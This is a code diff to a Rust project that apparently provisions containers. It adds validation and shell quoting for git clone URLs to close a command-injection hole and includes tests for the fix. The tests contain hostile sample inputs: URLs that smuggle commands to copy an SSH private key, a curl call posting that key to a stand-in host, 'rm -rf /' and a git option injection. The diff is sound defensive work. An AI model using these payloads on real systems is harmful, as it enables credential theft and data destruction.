@@ -1,4 +1,6 @@
 use gix_config::File;
+use lazy_static::lazy_static;
+use regex::Regex;
 
 use crate::{
     api::{GitApi, config::ConfigBody, container},
@@ -10,7 +12,42 @@ use crate::{
     },
 };
 
-use super::{id, labels::Labels, ssh};
+use super::{id, labels::Labels, sh, ssh};
+
+lazy_static! {
+    // Either scheme://[user@]host[:port]/path or the scp-like [user@]host:path.
+    static ref GIT_URL: Regex = Regex::new(
+        r"^(?:[a-zA-Z][a-zA-Z0-9+.\-]*://\S+|[A-Za-z0-9._\-]+(?:@[A-Za-z0-9._\-]+)?:\S+)$"
+    )
+    .unwrap();
+}
+
+// Clone URLs reach a shell (quoted) and git's argv, so both layers need guarding:
+// whitespace and control characters cannot appear in a real URL, and a leading
+// dash would make git parse the URL as an option.
+pub fn validate_clone_url(url: &str) -> Result<(), AnyError> {
+    if url.is_empty() {
+        return Err("git URL must not be empty".into());
+    }
+    if url.starts_with('-') {
+        return Err(format!("git URL must not start with '-': '{}'", url).into());
+    }
+    if url.chars().any(|c| c.is_whitespace() || c.is_control()) {
+        return Err(format!(
+            "git URL must not contain whitespace or control characters: '{}'",
+            url
+        )
+        .into());
+    }
+    if !GIT_URL.is_match(url) {
+        return Err(format!(
+            "not a well-formed git URL: '{}' (expected scheme://host/path or user@host:path)",
+            url
+        )
+        .into());
+    }
+    Ok(())
+}
 
 #[derive(Clone, Debug)]
 pub enum CloneUrls {
@@ -84,12 +121,39 @@ fn get_clone_dir(
         .replace(".git", "")
         .to_string();
 
+    if clone_work_dir.is_empty() || clone_work_dir == "." || clone_work_dir == ".." {
+        return Err(format!(
+            "could not derive a clone directory from URL: '{}'",
+            git_ssh_url
+        )
+        .into());
+    }
+
     log::debug!("Clone dir: {}", &clone_work_dir);
 
     let work_dir = format!("{}/{}", root_dir, clone_work_dir.clone());
 
     log::debug!("Full clone dir: {:?}", &work_dir);
     Ok(work_dir)
+}
+
+// `--` stops git from parsing a URL as an option; the shell quoting keeps the
+// whole value a single argument.
+fn clone_line(clone_dir: &str, depth: &str, url: &str) -> String {
+    format!(
+        "ls {}/.git > /dev/null 2>&1 || git -c include.path=/tmp/rooz/.gitconfig clone --filter=blob:none {} -- {}\n",
+        sh::quote(clone_dir),
+        depth,
+        sh::quote(url)
+    )
+}
+
+fn pull_line(clone_dir: &str) -> String {
+    let dir = sh::quote(clone_dir);
+    format!(
+        "ls {}/.git > /dev/null 2>&1 && git -C {} -c include.path=/tmp/rooz/.gitconfig pull\n",
+        dir, dir
+    )
 }
 
 impl<'a> GitApi<'a> {
@@ -109,27 +173,16 @@ impl<'a> GitApi<'a> {
         };
 
         for url in all_urls {
+            validate_clone_url(&url)?;
             let clone_dir = get_clone_dir(
                 &spec.working_dir,
                 &url,
                 &self.api.get_system_config().await?.gitconfig,
             )?;
-            clone_script.push_str(
-                format!(
-                    "ls '{}/.git' > /dev/null 2>&1 || git -c include.path=/tmp/rooz/.gitconfig clone --filter=blob:none {} {}\n",
-                    &clone_dir, &depth, &url
-                )
-                .as_str(),
-            );
+            clone_script.push_str(&clone_line(&clone_dir, &depth, &url));
 
             if spec.force_pull {
-                clone_script.push_str(
-                    format!(
-                        "ls '{}/.git' > /dev/null 2>&1 && git -C '{}' -c include.path=/tmp/rooz/.gitconfig pull\n",
-                        &clone_dir, &clone_dir
-                    )
-                        .as_str(),
-                );
+                clone_script.push_str(&pull_line(&clone_dir));
             }
         }
 
@@ -269,5 +322,86 @@ impl<'a> GitApi<'a> {
             .await?;
         self.api.container.kill(&container_id, false).await?;
         Ok((result, clone_dir))
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn well_formed_urls_pass() {
+        for url in [
+            "https://github.com/queil/rooz.git",
+            "http://gitea.local:3000/a/b.git",
+            "ssh://git@github.com:22/queil/rooz.git",
+            "git@github.com:queil/rooz.git",
+            "file:///srv/repos/rooz.git",
+        ] {
+            assert!(validate_clone_url(url).is_ok(), "rejected: {}", url);
+        }
+    }
+
+    #[test]
+    fn injection_payloads_are_rejected() {
+        for url in [
+            "",
+            "https://attacker.invalid/repo; cat /tmp/.ssh/id_ed25519 > /tmp/pwned",
+            "https://x.git && cat /tmp/.ssh/id_ed25519 > /tmp/pwned",
+            "https://attacker.invalid/x'; curl http://evil/ -d @/tmp/.ssh/id_ed25519 #",
+            "--upload-pack=touch /tmp/pwned",
+            "https://x.git\nrm -rf /",
+            "not a url",
+        ] {
+            assert!(validate_clone_url(url).is_err(), "accepted: {:?}", url);
+        }
+    }
+
+    #[test]
+    fn clone_line_quotes_url_and_dir() {
+        let line = clone_line("/work/re'po", "--depth=1", "https://h/a'b.git");
+        assert!(line.contains(r"ls '/work/re'\''po'/.git"), "{}", line);
+        assert!(line.ends_with("-- 'https://h/a'\\''b.git'\n"), "{}", line);
+    }
+
+    #[test]
+    fn pull_line_quotes_dir() {
+        let line = pull_line("/work/re'po");
+        assert_eq!(line.matches(r"'/work/re'\''po'").count(), 2, "{}", line);
+    }
+
+    #[test]
+    fn hostile_url_stays_one_argument_in_a_real_shell() {
+        // the payload shape from the report: the injected command must not run,
+        // and the URL must reach git as a single (bogus) argument
+        let dir = std::env::temp_dir().join("rooz-clone-injection-test");
+        let _ = std::fs::remove_file(&dir);
+        let hostile = format!("x'; touch {}; #", dir.display());
+        let line = clone_line("/work/repo", "", &hostile);
+        let out = std::process::Command::new("sh")
+            .arg("-c")
+            .arg(line.replace(
+                "git -c include.path=/tmp/rooz/.gitconfig clone",
+                "printf '%s\\n'",
+            ))
+            .output()
+            .unwrap();
+        let stdout = String::from_utf8(out.stdout).unwrap();
+        assert!(!dir.exists(), "injected command executed");
+        assert!(
+            stdout.lines().any(|l| l == hostile),
+            "url did not survive as one argument: {}",
+            stdout
+        );
+    }
+
+    #[test]
+    fn clone_dir_derivation_rejects_dot_segments() {
+        assert!(get_clone_dir("/work", "https://h/a/..", &None).is_err());
+        assert!(get_clone_dir("/work", "https://h/a/", &None).is_err());
+        assert_eq!(
+            get_clone_dir("/work", "https://h/rooz.git", &None).unwrap(),
+            "/work/rooz"
+        );
     }
 }
